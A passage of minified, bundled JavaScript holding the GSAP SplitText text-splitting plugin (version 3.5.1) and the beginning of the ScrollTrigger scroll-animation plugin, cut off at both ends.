\uDFF7-\uDFFF]|\uD83D[\uDC00-\uDCFD\uDCFF-\uDD3D\uDD49-\uDD4E\uDD50-\uDD67\uDD6F\uDD70\uDD73-\uDD7A\uDD87\uDD8A-\uDD8D\uDD90\uDD95\uDD96\uDDA4\uDDA5\uDDA8\uDDB1\uDDB2\uDDBC\uDDC2-\uDDC4\uDDD1-\uDDD3\uDDDC-\uDDDE\uDDE1\uDDE3\uDDE8\uDDEF\uDDF3\uDDFA-\uDE4F\uDE80-\uDEC5\uDECB-\uDED2\uDEE0-\uDEE5\uDEE9\uDEEB\uDEEC\uDEF0\uDEF3-\uDEF8]|\uD83E[\uDD10-\uDD3A\uDD3C-\uDD3E\uDD40-\uDD45\uDD47-\uDD4C\uDD50-\uDD6B\uDD80-\uDD97\uDDC0\uDDD0-\uDDE6])\uFE0F)/,
        s = /(?:\r|\n|\t\t)/g,
        o = /(?:\s\s+)/g,
        a = function (t) {
          return r.getComputedStyle(t);
        },
        l = Array.isArray,
        h = [].slice,
        u = function (t, r) {
          var i;
          return l(t)
            ? t
            : "string" == (i = typeof t) && !r && t
            ? h.call(e.querySelectorAll(t), 0)
            : t && "object" === i && "length" in t
            ? h.call(t, 0)
            : t
            ? [t]
            : [];
        },
        c = function (t) {
          return "absolute" === t.position || !0 === t.absolute;
        },
        d = function (t, e) {
          for (var r, i = e.length; --i > -1; )
            if (((r = e[i]), t.substr(0, r.length) === r)) return r.length;
        },
        p = function (t, e) {
          void 0 === t && (t = "");
          var r = ~t.indexOf("++"),
            i = 1;
          return (
            r && (t = t.split("++").join("")),
            function () {
              return (
                "<" +
                e +
                " style='position:relative;display:inline-block;'" +
                (t ? " class='" + t + (r ? i++ : "") + "'>" : ">")
              );
            }
          );
        },
        f = function t(e, r, i) {
          var n = e.nodeType;
          if (1 === n || 9 === n || 11 === n)
            for (e = e.firstChild; e; e = e.nextSibling) t(e, r, i);
          else
            (3 !== n && 4 !== n) ||
              (e.nodeValue = e.nodeValue.split(r).join(i));
        },
        g = function (t, e) {
          for (var r = e.length; --r > -1; ) t.push(e[r]);
        },
        m = function (t, e, r) {
          for (var i; t && t !== e; ) {
            if ((i = t._next || t.nextSibling))
              return i.textContent.charAt(0) === r;
            t = t.parentNode || t._parent;
          }
        },
        _ = function t(e) {
          var r,
            i,
            n = u(e.childNodes),
            s = n.length;
          for (r = 0; r < s; r++)
            (i = n[r])._isSplit
              ? t(i)
              : (r && 3 === i.previousSibling.nodeType
                  ? (i.previousSibling.nodeValue +=
                      3 === i.nodeType ? i.nodeValue : i.firstChild.nodeValue)
                  : 3 !== i.nodeType && e.insertBefore(i.firstChild, i),
                e.removeChild(i));
        },
        v = function (t, e) {
          return parseFloat(e[t]) || 0;
        },
        y = function (t, r, i, n, s, o, l) {
          var h,
            u,
            d,
            p,
            y,
            D,
            x,
            b,
            w,
            T,
            S,
            E,
            C = a(t),
            P = v("paddingLeft", C),
            F = -999,
            M = v("borderBottomWidth", C) + v("borderTopWidth", C),
            R = v("borderLeftWidth", C) + v("borderRightWidth", C),
            A = v("paddingTop", C) + v("paddingBottom", C),
            O = v("paddingLeft", C) + v("paddingRight", C),
            k = v("fontSize", C) * (r.lineThreshold || 0.2),
            L = C.textAlign,
            B = [],
            z = [],
            I = [],
            j = r.wordDelimiter || " ",
            V = r.tag ? r.tag : r.span ? "span" : "div",
            N = r.type || r.split || "chars,words,lines",
            U = s && ~N.indexOf("lines") ? [] : null,
            W = ~N.indexOf("words"),
            H = ~N.indexOf("chars"),
            q = c(r),
            X = r.linesClass,
            Y = ~(X || "").indexOf("++"),
            G = [];
          for (
            Y && (X = X.split("++").join("")),
              d = (u = t.getElementsByTagName("*")).length,
              y = [],
              h = 0;
            h < d;
            h++
          )
            y[h] = u[h];
          if (U || q)
            for (h = 0; h < d; h++)
              ((D = (p = y[h]).parentNode === t) || q || (H && !W)) &&
                ((E = p.offsetTop),
                U &&
                  D &&
                  Math.abs(E - F) > k &&
                  ("BR" !== p.nodeName || 0 === h) &&
                  ((x = []), U.push(x), (F = E)),
                q &&
                  ((p._x = p.offsetLeft),
                  (p._y = E),
                  (p._w = p.offsetWidth),
                  (p._h = p.offsetHeight)),
                U &&
                  (((p._isSplit && D) ||
                    (!H && D) ||
                    (W && D) ||
                    (!W &&
                      p.parentNode.parentNode === t &&
                      !p.parentNode._isSplit)) &&
                    (x.push(p), (p._x -= P), m(p, t, j) && (p._wordEnd = !0)),
                  "BR" === p.nodeName &&
                    ((p.nextSibling && "BR" === p.nextSibling.nodeName) ||
                      0 === h) &&
                    U.push([])));
          for (h = 0; h < d; h++)
            (D = (p = y[h]).parentNode === t),
              "BR" !== p.nodeName
                ? (q &&
                    ((w = p.style),
                    W ||
                      D ||
                      ((p._x += p.parentNode._x), (p._y += p.parentNode._y)),
                    (w.left = p._x + "px"),
                    (w.top = p._y + "px"),
                    (w.position = "absolute"),
                    (w.display = "block"),
                    (w.width = p._w + 1 + "px"),
                    (w.height = p._h + "px")),
                  !W && H
                    ? p._isSplit
                      ? ((p._next = p.nextSibling), p.parentNode.appendChild(p))
                      : p.parentNode._isSplit
                      ? ((p._parent = p.parentNode),
                        !p.previousSibling &&
                          p.firstChild &&
                          (p.firstChild._isFirst = !0),
                        p.nextSibling &&
                          " " === p.nextSibling.textContent &&
                          !p.nextSibling.nextSibling &&
                          G.push(p.nextSibling),
                        (p._next =
                          p.nextSibling && p.nextSibling._isFirst
                            ? null
                            : p.nextSibling),
                        p.parentNode.removeChild(p),
                        y.splice(h--, 1),
                        d--)
                      : D ||
                        ((E = !p.nextSibling && m(p.parentNode, t, j)),
                        p.parentNode._parent &&
                          p.parentNode._parent.appendChild(p),
                        E && p.parentNode.appendChild(e.createTextNode(" ")),
                        "span" === V && (p.style.display = "inline"),
                        B.push(p))
                    : p.parentNode._isSplit && !p._isSplit && "" !== p.innerHTML
                    ? z.push(p)
                    : H &&
                      !p._isSplit &&
                      ("span" === V && (p.style.display = "inline"), B.push(p)))
                : U || q
                ? (p.parentNode && p.parentNode.removeChild(p),
                  y.splice(h--, 1),
                  d--)
                : W || t.appendChild(p);
          for (h = G.length; --h > -1; ) G[h].parentNode.removeChild(G[h]);
          if (U) {
            for (
              q &&
                ((T = e.createElement(V)),
                t.appendChild(T),
                (S = T.offsetWidth + "px"),
                (E = T.offsetParent === t ? 0 : t.offsetLeft),
                t.removeChild(T)),
                w = t.style.cssText,
                t.style.cssText = "display:none;";
              t.firstChild;

            )
              t.removeChild(t.firstChild);
            for (
              b = " " === j && (!q || (!W && !H)), h = 0;
              h < U.length;
              h++
            ) {
              for (
                x = U[h],
                  (T = e.createElement(V)).style.cssText =
                    "display:block;text-align:" +
                    L +
                    ";position:" +
                    (q ? "absolute;" : "relative;"),
                  X && (T.className = X + (Y ? h + 1 : "")),
                  I.push(T),
                  d = x.length,
                  u = 0;
                u < d;
                u++
              )
                "BR" !== x[u].nodeName &&
                  ((p = x[u]),
                  T.appendChild(p),
                  b && p._wordEnd && T.appendChild(e.createTextNode(" ")),
                  q &&
                    (0 === u &&
                      ((T.style.top = p._y + "px"),
                      (T.style.left = P + E + "px")),
                    (p.style.top = "0px"),
                    E && (p.style.left = p._x - E + "px")));
              0 === d
                ? (T.innerHTML = "&nbsp;")
                : W || H || (_(T), f(T, String.fromCharCode(160), " ")),
                q && ((T.style.width = S), (T.style.height = p._h + "px")),
                t.appendChild(T);
            }
            t.style.cssText = w;
          }
          q &&
            (l > t.clientHeight &&
              ((t.style.height = l - A + "px"),
              t.clientHeight < l && (t.style.height = l + M + "px")),
            o > t.clientWidth &&
              ((t.style.width = o - O + "px"),
              t.clientWidth < o && (t.style.width = o + R + "px"))),
            g(i, B),
            W && g(n, z),
            g(s, I);
        },
        D = function (t, r, i, a) {
          var l,
            h,
            u,
            p,
            g,
            m,
            _,
            v,
            y = r.tag ? r.tag : r.span ? "span" : "div",
            D = ~(r.type || r.split || "chars,words,lines").indexOf("chars"),
            x = c(r),
            b = r.wordDelimiter || " ",
            w = " " !== b ? "" : x ? "&#173; " : " ",
            T = "</" + y + ">",
            S = 1,
            E = r.specialChars
              ? "function" == typeof r.specialChars
                ? r.specialChars
                : d
              : null,
            C = e.createElement("div"),
            P = t.parentNode;
          for (
            P.insertBefore(C, t),
              C.textContent = t.nodeValue,
              P.removeChild(t),
              _ =
                -1 !==
                (l = (function t(e) {
                  var r = e.nodeType,
                    i = "";
                  if (1 === r || 9 === r || 11 === r) {
                    if ("string" == typeof e.textContent) return e.textContent;
                    for (e = e.firstChild; e; e = e.nextSibling) i += t(e);
                  } else if (3 === r || 4 === r) return e.nodeValue;
                  return i;
                })((t = C))).indexOf("<"),
              !1 !== r.reduceWhiteSpace &&
                (l = l.replace(o, " ").replace(s, "")),
              _ && (l = l.split("<").join("{{LT}}")),
              g = l.length,
              h = (" " === l.charAt(0) ? w : "") + i(),
              u = 0;
            u < g;
            u++
          )
            if (((m = l.charAt(u)), E && (v = E(l.substr(u), r.specialChars))))
              (m = l.substr(u, v || 1)),
                (h += D && " " !== m ? a() + m + "</" + y + ">" : m),
                (u += v - 1);
            else if (m === b && l.charAt(u - 1) !== b && u) {
              for (h += S ? T : "", S = 0; l.charAt(u + 1) === b; )
                (h += w), u++;
              u === g - 1
                ? (h += w)
                : ")" !== l.charAt(u + 1) && ((h += w + i()), (S = 1));
            } else
              "{" === m && "{{LT}}" === l.substr(u, 6)
                ? ((h += D ? a() + "{{LT}}</" + y + ">" : "{{LT}}"), (u += 5))
                : (m.charCodeAt(0) >= 55296 && m.charCodeAt(0) <= 56319) ||
                  (l.charCodeAt(u + 1) >= 65024 && l.charCodeAt(u + 1) <= 65039)
                ? ((p =
                    ((l.substr(u, 12).split(n) || [])[1] || "").length || 2),
                  (h +=
                    D && " " !== m
                      ? a() + l.substr(u, p) + "</" + y + ">"
                      : l.substr(u, p)),
                  (u += p - 1))
                : (h += D && " " !== m ? a() + m + "</" + y + ">" : m);
          (t.outerHTML = h + (S ? T : "")), _ && f(P, "{{LT}}", "<");
        },
        x = function t(e, r, i, n) {
          var s,
            o,
            l = u(e.childNodes),
            h = l.length,
            d = c(r);
          if (3 !== e.nodeType || h > 1) {
            for (r.absolute = !1, s = 0; s < h; s++)
              (3 !== (o = l[s]).nodeType || /\S+/.test(o.nodeValue)) &&
                (d &&
                  3 !== o.nodeType &&
                  "inline" === a(o).display &&
                  ((o.style.display = "inline-block"),
                  (o.style.position = "relative")),
                (o._isSplit = !0),
                t(o, r, i, n));
            return (r.absolute = d), void (e._isSplit = !0);
          }
          D(e, r, i, n);
        },
        b = (function () {
          function t(t, n) {
            i || ((e = document), (r = window), (i = 1)),
              (this.elements = u(t)),
              (this.chars = []),
              (this.words = []),
              (this.lines = []),
              (this._originals = []),
              (this.vars = n || {}),
              this.split(n);
          }
          var n = t.prototype;
          return (
            (n.split = function (t) {
              this.isSplit && this.revert(),
                (this.vars = t = t || this.vars),
                (this._originals.length =
                  this.chars.length =
                  this.words.length =
                  this.lines.length =
                    0);
              for (
                var e,
                  r,
                  i,
                  n = this.elements.length,
                  s = t.tag ? t.tag : t.span ? "span" : "div",
                  o = p(t.wordsClass, s),
                  a = p(t.charsClass, s);
                --n > -1;

              )
                (i = this.elements[n]),
                  (this._originals[n] = i.innerHTML),
                  (e = i.clientHeight),
                  (r = i.clientWidth),
                  x(i, t, o, a),
                  y(i, t, this.chars, this.words, this.lines, r, e);
              return (
                this.chars.reverse(),
                this.words.reverse(),
                this.lines.reverse(),
                (this.isSplit = !0),
                this
              );
            }),
            (n.revert = function () {
              var t = this._originals;
              if (!t) throw "revert() call wasn't scoped properly.";
              return (
                this.elements.forEach(function (e, r) {
                  return (e.innerHTML = t[r]);
                }),
                (this.chars = []),
                (this.words = []),
                (this.lines = []),
                (this.isSplit = !1),
                this
              );
            }),
            (t.create = function (e, r) {
              return new t(e, r);
            }),
            t
          );
        })();
      (b.version = "3.5.1"),
        (t.SplitText = b),
        (t.default = b),
        Object.defineProperty(t, "__esModule", { value: !0 });
    })(e);
  },
  function (t, e, r) {
    var i = r(49),
      n = r(29);
    t.exports = function (t) {
      return i(n(t));
    };
  },
  function (t, e, r) {
    !(function (t) {
      "use strict";
      var e,
        r,
        i,
        n,
        s,
        o,
        a,
        l,
        h,
        u,
        c,
        d,
        p,
        f,
        g,
        m,
        _,
        v,
        y,
        D,
        x,
        b,
        w,
        T,
        S,
        E = 1,
        C = [],
        P = [],
        F = Date.now,
        M = F(),
        R = 0,
        A = 1,
        O = function (t) {
          return t;
        },
        k = function () {
          return "undefined" != typeof window;
        },
        L = function () {
          return e || (k() && (e = window.gsap) && e.registerPlugin && e);
        },
        B = function (t) {
          return !!~a.indexOf(t);
        },
        z = function (t, e) {
          return ~C.indexOf(t) && C[C.indexOf(t) + 1][e];
        },
        I = function (t, e) {
          var r = e.s,
            i = e.sc,
            n = P.indexOf(t),
            s = i === $.sc ? 1 : 2;
          return (
            !~n && (n = P.push(t) - 1),
            P[n + s] ||
              (P[n + s] =
                z(t, r) ||
                (B(t)
                  ? i
                  : function (e) {
                      return arguments.length ? (t[r] = e) : t[r];
                    }))
          );
        },
        j = function (t) {
          return (
            z(t, "getBoundingClientRect") ||
            (B(t)
              ? function () {
                  return (
                    (Bt.width = i.innerWidth), (Bt.height = i.innerHeight), Bt
                  );
                }
              : function () {
                  return et(t);
                })
          );
        },
        V = function (t, e) {
          var r = e.s,
            n = e.d2,
            a = e.d,
            l = e.a;
          return (r = "scroll" + n) && (l = z(t, r))
            ? l() - j(t)()[a]
            : B(t)
            ? Math.max(s[r], o[r]) -
              (i["inner" + n] || s["client" + n] || o["client" + n])
            : t[r] - t["offset" + n];
        },
        N = function (t, e) {
          for (var r = 0; r < x.length; r += 3)
            (!e || ~e.indexOf(x[r + 1])) && t(x[r], x[r + 1], x[r + 2]);
        },
        U = function (t) {
          return "string" == typeof t;
        },
        W = function (t) {
          return "function" == typeof t;
        },
        H = function (t) {
          return "number" == typeof t;
        },
        q = function (t) {
          return "object" == typeof t;
        },
        X = function (t) {
          return W(t) && t();
        },
        Y = function (t, e) {
          return function () {
            var r = X(t),
              i = X(e);
            return function () {
              X(r), X(i);
            };
          };
        },
        G = Math.abs,
        K = "padding",
        Q = "px",
        Z = {
          s: "scrollLeft",
          p: "left",
          p2: "Left",
          os: "right",
          os2: "Right",
          d: "width",
          d2: "Width",
          a: "x",
          sc: function (t) {
            return arguments.length
              ? i.scrollTo(t, $.sc())
              : i.pageXOffset ||
                  n.scrollLeft ||
                  s.scrollLeft ||
                  o.scrollLeft ||
                  0;
          },
        },
        $ = {
          s: "scrollTop",
          p: "top",
          p2: "Top",
          os: "bottom",
          os2: "Bottom",
          d: "height",
          d2: "Height",
          a: "y",
          op: Z,
          sc: function (t) {
            return arguments.length
              ? i.scrollTo(Z.sc(), t)
              : i.pageYOffset || n.scrollTop || s.scrollTop || o.scrollTop || 0;
          },
        },
        J = function (t) {
          return i.getComputedStyle(t);
        },
        tt = function (t, e) {
          for (var r in e) r in t || (t[r] = e[r]);
          return t;
        },
        et = function (t, r) {
          var i =
              r &&
              "matrix(1, 0, 0, 1, 0, 0)" !== J(t)[_] &&
              e
                .to(t, {
                  x: 0,
                  y: 0,
                  xPercent: 0,
                  yPercent: 0,
                  rotation: 0,
                  rotationX: 0,
                  rotationY: 0,
                  scale: 1,
                  skewX: 0,
                  skewY: 0,
                })
                .progress(1),
            n = t.getBoundingClientRect();
          return i && i.progress(0).kill(), n;
        },
        rt = function (t, e) {
          var r = e.d2;
          return t["offset" + r] || t["client" + r] || 0;
        },
        it = function (t, e, r, i) {
          return r.split(",").forEach(function (r) {
            return t(e, r, i);
          });
        },
        nt = function (t, e, r) {
          return t.addEventListener(e, r, { passive: !0 });
        },
        st = function (t, e, r) {
          return t.removeEventListener(e, r);
        },
        ot = {
          startColor: "green",
          endColor: "red",
          indent: 0,
          fontSize: "16px",
          fontWeight: "normal",
        },
        at = { toggleActions: "play", anticipatePin: 0 },
        lt = { top: 0, left: 0, center: 0.5, bottom: 1, right: 1 },
        ht = function (t, e) {
          if (U(t)) {
            var r = t.indexOf("="),
              i = ~r ? +(t.charAt(r - 1) + 1) * parseFloat(t.substr(r + 1)) : 0;
            i &&
              (t.indexOf("%") > r && (i *= e / 100), (t = t.substr(0, r - 1))),
              (t =
                i +
                (t in lt
                  ? lt[t] * e
                  : ~t.indexOf("%")
                  ? (parseFloat(t) * e) / 100
                  : parseFloat(t) || 0));
          }
          return t;
        },
        ut = function (t, e, r, i, s, a, l) {
          var h = s.startColor,
            u = s.endColor,
            c = s.fontSize,
            d = s.indent,
            p = s.fontWeight,
            f = n.createElement("div"),
            g = B(r) || "fixed" === z(r, "pinType"),
            m = -1 !== t.indexOf("scroller"),
            _ = g ? o : r,
            v = -1 !== t.indexOf("start"),
            y = v ? h : u,
            D =
              "border-color:" +
              y +
              ";font-size:" +
              c +
              ";color:" +
              y +
              ";font-weight:" +
              p +
              ";pointer-events:none;white-space:nowrap;font-family:sans-serif,Arial;z-index:1000;padding:4px 8px;border-width:0;border-style:solid;";
          return (
            (D += "position:" + (m && g ? "fixed;" : "absolute;")),
            (m || !g) &&
              (D +=
                (i === $ ? "right" : "bottom") +
                ":" +
                (a + parseFloat(d)) +
                "px;"),
            l &&
              (D +=
                "box-sizing:border-box;text-align:left;width:" +
                l.offsetWidth +
                "px;"),
            (f._isStart = v),
            f.setAttribute("class", "gsap-marker-" + t),
            (f.style.cssText = D),
            (f.innerText = e || 0 === e ? t + "-" + e : t),
            _.insertBefore(f, _.children[0]),
            (f._offset = f["offset" + i.op.d2]),
            ct(f, 0, i, v),
            f
          );
        },
        ct = function (t, r, i, n) {
          var s = { display: "block" },
            o = i[n ? "os2" : "p2"],
            a = i[n ? "p2" : "os2"];
          (t._isFlipped = n),
            (s[i.a + "Percent"] = n ? -100 : 0),
            (s[i.a] = n ? 1 : 0),
            (s["border" + o + "Width"] = 1),
            (s["border" + a + "Width"] = 0),
            (s[i.p] = r),
            e.set(t, s);
        },
        dt = [],
        pt = {},
        ft = function () {
          return u || (u = h(Ft));
        },
        gt = function () {
          u || ((u = h(Ft)), R || bt("scrollStart"), (R = F()));
        },
        mt = function () {
          return !g && l.restart(!0);
        },
        _t = {},
        vt = [],
        yt = [],
        Dt = function (t) {
          var r,
            n = e.ticker.frame,
            s = [],
            o = 0;
          if (S !== n || E) {
            for (St(); o < yt.length; o += 4)
              (r = i.matchMedia(yt[o]).matches) !== yt[o + 3] &&
                ((yt[o + 3] = r),
                r ? s.push(o) : St(1, yt[o]) || (W(yt[o + 2]) && yt[o + 2]()));
            for (Tt(), o = 0; o < s.length; o++)
              (r = s[o]), (T = yt[r]), (yt[r + 2] = yt[r + 1](t));
            (T = 0), Et(0, 1), (S = n), bt("matchMedia");
          }
        },
        xt = function t() {
          return st(Nt, "scrollEnd", t) || Et(!0);
        },
        bt = function (t) {
          return (
            (_t[t] &&
              _t[t].map(function (t) {
                return t();
              })) ||
            vt
          );
        },
        wt = [],
        Tt = function (t) {
          for (var e = 0; e < wt.length; e += 4)
            (t && wt[e + 3] !== t) ||
              ((wt[e].style.cssText = wt[e + 1]), (wt[e + 2].uncache = 1));
        },
        St = function (t, e) {
          var r;
          for (v = 0; v < dt.length; v++)
            (r = dt[v]),
              (e && r.media !== e) ||
                (t
                  ? r.kill(1)
                  : (r.scroll.rec || (r.scroll.rec = r.scroll()), r.revert()));
          Tt(e), e || bt("revert");
        },
        Et = function (t, e) {
          if (!R || t) {
            var r = bt("refreshInit");
            for (b && Nt.sort(), e || St(), v = 0; v < dt.length; v++)
              dt[v].refresh();
            for (
              r.forEach(function (t) {
                return t && t.render && t.render(-1);
              }),
                v = dt.length;
              v--;

            )
              dt[v].scroll.rec = 0;
            l.pause(), bt("refresh");
          } else nt(Nt, "scrollEnd", xt);
        },
        Ct = 0,
        Pt = 1,
        Ft = function () {
          var t = dt.length,
            e = F(),
            r = e - M >= 50,
            i = t && dt[0].scroll();
          if (
            ((Pt = Ct > i ? -1 : 1),
            (Ct = i),
            r &&
              (R && !m && e - R > 200 && ((R = 0), bt("scrollEnd")),
              (p = M),
              (M = e)),
            Pt < 0)
          ) {
            for (v = t; v--; ) dt[v] && dt[v].update(0, r);
            Pt = 1;
          } else for (v = 0; v < t; v++) dt[v] && dt[v].update(0, r);
          u = 0;
        },
        Mt = [
          "left",
          "top",
          "bottom",
          "right",
          "marginBottom",
          "marginRight",
          "marginTop",
          "marginLeft",
          "display",
          "flexShrink",
          "float",
        ],
        Rt = Mt.concat([
          "width",
          "height",
          "boxSizing",
          "maxWidth",
          "maxHeight",
          "position",
          "margin",
          K,
          K + "Top",
          K + "Right",
          K + "Bottom",
          K + "Left",
        ]),
        At = function (t, e, r, i) {
          if (t.parentNode !== e) {
            for (var n, s = Mt.length, o = e.style, a = t.style; s--; )
              o[(n = Mt[s])] = r[n];
            (o.position = "absolute" === r.position ? "absolute" : "relative"),
              "inline" === r.display && (o.display = "inline-block"),
              (a.bottom = a.right = "auto"),
              (o.overflow = "visible"),
              (o.boxSizing = "border-box"),
              (o.width = rt(t, Z) + Q),
              (o.height = rt(t, $) + Q),
              (o[K] = a.margin = a.top = a.left = "0"),
              kt(i),
              (a.width = a.maxWidth = r.width),
              (a.height = a.maxHeight = r.height),
              (a[K] = r[K]),
              t.parentNode.insertBefore(e, t),
              e.appendChild(t);
          }
        },
        Ot = /([A-Z])/g,
        kt = function (t) {
          if (t)
            for (var e, r, i = t.t.style, n = t.length, s = 0; s < n; s += 2)
              (r = t[s + 1]),
                (e = t[s]),
                r
                  ? (i[e] = r)
                  : i[e] &&
                    i.removeProperty(e.replace(Ot, "-$1").toLowerCase());
        },
        Lt = function (t) {
          for (var e = Rt.length, r = t.style, i = [], n = 0; n < e; n++)
            i.push(Rt[n], r[Rt[n]]);
          return (i.t = t), i;
        },
        Bt = { left: 0, top: 0 },
        zt = function (t, e, r, i, n, a, l, h, u, d, p, f) {
          if (
            (W(t) && (t = t(h)),
            U(t) &&
              "max" === t.substr(0, 3) &&
              (t = f + ("=" === t.charAt(4) ? ht("0" + t.substr(3), r) : 0)),
            H(t))
          )
            l && ct(l, r, i, !0);
          else {
            W(e) && (e = e(h));
            var g,
              m,
              _,
              v = c(e)[0] || o,
              y = et(v) || {},
              D = t.split(" ");
            (y && (y.left || y.top)) ||
              "none" !== J(v).display ||
              ((_ = v.style.display),
              (v.style.display = "block"),
              (y = et(v)),
              _ ? (v.style.display = _) : v.style.removeProperty("display")),
              (g = ht(D[0], y[i.d])),
              (m = ht(D[1] || "0", r)),
              (t = y[i.p] - u[i.p] - d + g + n - m),
              l && ct(l, m, i, r - m < 20 || (l._isStart && m > 20)),
              (r -= r - m);
          }
          if (a) {
            var x = t + r,
              b = a._isStart;
            (f = "scroll" + i.d2),
              ct(
                a,
                x,
                i,
                (b && x > 20) ||
                  (!b && (p ? Math.max(o[f], s[f]) : a.parentNode[f]) <= x + 1)
              ),
              p &&
                ((u = et(l)),
                p && (a.style[i.op.p] = u[i.op.p] - i.op.m - a._offset + Q));
          }
          return Math.round(t);
        },
        It = /(?:webkit|moz|length|cssText)/i,
        jt = function (t, r, i, n) {
          if (t.parentNode !== r) {
            var s,
              a,
              l = t.style;
            if (r === o) {
              for (s in ((t._stOrig = l.cssText), (a = J(t))))
                +s ||
                  It.test(s) ||
                  !a[s] ||
                  "string" != typeof l[s] ||
                  "0" === s ||
                  (l[s] = a[s]);
              (l.top = i), (l.left = n);
            } else l.cssText = t._stOrig;
            (e.core.getCache(t).uncache = 1), r.appendChild(t);
          }
        },
        Vt = function (t, r) {
          var i,
            n,
            s = I(t, r),
            o = "_scroll" + r.p2;
          return (
            (t[o] = s),
            function r(a, l, h, u, c) {
              var d = r.tween,
                p = l.onComplete,
                f = {};
              return (
                d && d.kill(),
                (i = Math.round(h)),
                (l[o] = a),
                (l.modifiers = f),
                (f[o] = function (t) {
                  return (
                    (t = Math.round(s())) !== i && t !== n
                      ? (d.kill(), (r.tween = 0))
                      : (t = h + u * d.ratio + c * d.ratio * d.ratio),
                    (n = i),
                    (i = Math.round(t))
                  );
                }),
                (l.onComplete = function () {
                  (r.tween = 0), p && p.call(d);
                }),
                (d = r.tween = e.to(t, l))
              );
            }
          );
        };
      Z.op = $;
      var Nt = (function () {
        function t(i, n) {
          r ||
            t.register(e) ||
            console.warn("Please gsap.registerPlugin(ScrollTrigger)"),
            this.init(i, n);
        }
        return (
          (t.prototype.init = function (r, a) {
            if (((this.progress = 0), this.vars && this.kill(1), A)) {
              var l,
                h,
                u,
                f,
                _,
                y,
                D,
                x,
                S,
                P,
                M,
                k,
                L,
                N,
                X,
                Y,
                it,
                lt,
                ct,
                ft,
                _t,
                vt,
                yt,
                Dt,
                bt,
                wt,
                Tt,
                St,
                Et,
                Ct,
                Ft,
                Mt,
                Rt,
                Ot,
                It,
                Nt,
                Ut,
                Wt,
                Ht = (r = tt(
                  U(r) || H(r) || r.nodeType ? { trigger: r } : r,
                  at
                )).horizontal
                  ? Z
                  : $,
                qt = r,
                Xt = qt.onUpdate,
                Yt = qt.toggleClass,
                Gt = qt.id,
                Kt = qt.onToggle,
                Qt = qt.onRefresh,
                Zt = qt.scrub,
                $t = qt.trigger,
                Jt = qt.pin,
                te = qt.pinSpacing,
                ee = qt.invalidateOnRefresh,
                re = qt.anticipatePin,
                ie = qt.onScrubComplete,
                ne = qt.onSnapComplete,
                se = qt.once,
                oe = qt.snap,
                ae = qt.pinReparent,
                le = !Zt && 0 !== Zt,
                he = c(r.scroller || i)[0],
                ue = e.core.getCache(he),
                ce = B(he),
                de =
                  "pinType" in r
                    ? "fixed" === r.pinType
                    : ce || "fixed" === z(he, "pinType"),
                pe = [r.onEnter, r.onLeave, r.onEnterBack, r.onLeaveBack],
                fe = le && r.toggleActions.split(" "),
                ge = "markers" in r ? r.markers : at.markers,
                me = ce
                  ? 0
                  : parseFloat(J(he)["border" + Ht.p2 + "Width"]) || 0,
                _e = this,
                ve =
                  r.onRefreshInit &&
                  function () {
                    return r.onRefreshInit(_e);
                  },
                ye = (function (t, e, r) {
                  var n = r.d,
                    s = r.d2,
                    o = r.a;
                  return (o = z(t, "getBoundingClientRect"))
                    ? function () {
                        return o()[n];
                      }
                    : function () {
                        return (e ? i["inner" + s] : t["client" + s]) || 0;
                      };
                })(he, ce, Ht),
                De = (function (t, e) {
                  return !e || ~C.indexOf(t)
                    ? j(t)
                    : function () {
                        return Bt;
                      };
                })(he, ce);
              (_e.media = T),
                (re *= 45),
                dt.push(_e),
                (_e.scroller = he),
                (_e.scroll = I(he, Ht)),
                (_ = _e.scroll()),
                (_e.vars = r),
                (a = a || r.animation),
                "refreshPriority" in r && (b = 1),
                (ue.tweenScroll = ue.tweenScroll || {
                  top: Vt(he, $),
                  left: Vt(he, Z),
                }),
                (_e.tweenTo = l = ue.tweenScroll[Ht.p]),
                a &&
                  ((a.vars.lazy = !1),
                  a._initted ||
                    (!1 !== a.vars.immediateRender &&
                      !1 !== r.immediateRender &&
                      a.render(0, !0, !0)),
                  (_e.animation = a.pause()),
                  (a.scrollTrigger = _e),
                  (Mt = H(Zt) && Zt) &&
                    (Ft = e.to(a, {
                      ease: "power3",
                      duration: Mt,
                      onComplete: function () {
                        return ie && ie(_e);
                      },
                    })),
                  (Et = 0),
                  Gt || (Gt = a.vars.id)),
                oe &&
                  (q(oe) || (oe = { snapTo: oe }),
                  e.set(ce ? [o, s] : he, { scrollBehavior: "auto" }),
                  (u = W(oe.snapTo)
                    ? oe.snapTo
                    : "labels" === oe.snapTo
                    ? (function (t) {
                        return function (r) {
                          var i,
                            n = [],
                            s = t.labels,
                            o = t.duration();
                          for (i in s) n.push(s[i] / o);
                          return e.utils.snap(n, r);
                        };
                      })(a)
                    : e.utils.snap(oe.snapTo)),
                  (Rt = oe.duration || { min: 0.1, max: 2 }),
                  (Rt = q(Rt) ? d(Rt.min, Rt.max) : d(Rt, Rt)),
                  (Ot = e
                    .delayedCall(oe.delay || Mt / 2 || 0.1, function () {
                      if (Math.abs(_e.getVelocity()) < 10 && !m) {
                        var t = a && !le ? a.totalProgress() : _e.progress,
                          e = ((t - Ct) / (F() - p)) * 1e3 || 0,
                          r = (G(e / 2) * e) / 0.185,
                          i = t + r,
                          n = d(0, 1, u(i, _e)),
                          s = _e.scroll(),
                          o = Math.round(D + n * N),
                          h = l.tween;
                        if (s <= x && s >= D && o !== s) {
                          if (h && !h._initted && h.data <= Math.abs(o - s))
                            return;
                          l(
                            o,
                            {
                              duration: Rt(
                                G(
                                  (0.185 * Math.max(G(i - t), G(n - t))) /
                                    e /
                                    0.05 || 0
                                )
                              ),
                              ease: oe.ease || "power3",
                              data: Math.abs(o - s),
                              onComplete: function () {
                                (Et = Ct =
                                  a && !le ? a.totalProgress() : _e.progress),
                                  ne && ne(_e);
                              },
                            },
                            s,
                            r * N,
                            o - s - r * N
                          );
                        }
                      } else _e.isActive && Ot.restart(!0);
                    })
                    .pause())),
                Gt && (pt[Gt] = _e),
                ($t = _e.trigger = c($t || Jt)[0]),
                (Jt = !0 === Jt ? $t : c(Jt)[0]),
                U(Yt) && (Yt = { targets: $t, className: Yt }),
                Jt &&
                  (!1 === te ||
                    "margin" === te ||
                    (te = !(!te && "flex" === J(Jt.parentNode).display) && K),
                  (_e.pin = Jt),
                  !1 !== r.force3D && e.set(Jt, { force3D: !0 }),
                  (h = e.core.getCache(Jt)).spacer
                    ? (X = h.pinState)
                    : ((h.spacer = lt = n.createElement("div")),
                      lt.setAttribute(
                        "class",
                        "pin-spacer" + (Gt ? " pin-spacer-" + Gt : "")
                      ),
                      (h.pinState = X = Lt(Jt))),
                  (_e.spacer = lt = h.spacer),
